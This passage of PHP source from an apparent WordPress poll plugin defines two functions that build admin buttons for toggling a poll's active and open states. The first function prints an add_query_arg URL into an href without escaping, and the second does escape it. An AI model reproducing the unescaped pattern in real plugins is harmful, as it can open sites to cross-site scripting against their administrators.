 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_activatation_buttons( $poll, $url = false ){
	if( $poll->active )
		$out = '<a class="button" href="'. add_query_arg( array('dmc_deactivate_poll'=> $poll->id, 'dmc_activate_poll'=>null), $url ) .'" title="'. __('Деактивировать','dem') .'"><span class="dashicons dashicons-controls-pause"></span></a>';
	else
		$out = '<a class="button" href="'. add_query_arg( array('dmc_activate_poll'=> $poll->id, 'dmc_deactivate_poll'=>null), $url ) .'" title="'. __('Активировать','dem') .'"><span class="dashicons dashicons-controls-play"></span></a>';
	
	return $out;
}

/**
 * Выводит кнопки открытия/закрытия опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_opening_buttons( $poll, $url = false ){
	if( $poll->open )
		$out = '<a class="button" href="'. esc_url( add_query_arg( array('dmc_close_poll'=> $poll->id, 'dmc_open_poll'=>null), $url ) ) .'" title="'. __('Закрыть голосование','dem') .'"><span class="dashicons dashicons-no"></span></a>';
	else
		$out = '<a class="button" href="'. esc_url( add_query_arg( array('dmc_open_poll'=> $poll->id, 'dmc_close_poll'=>null), $url ) ) .'" title="'. __('Открыть голосование','dem') .'"><span class="dashicons dashicons-yes"></span></a>';
	
	return $out;
}
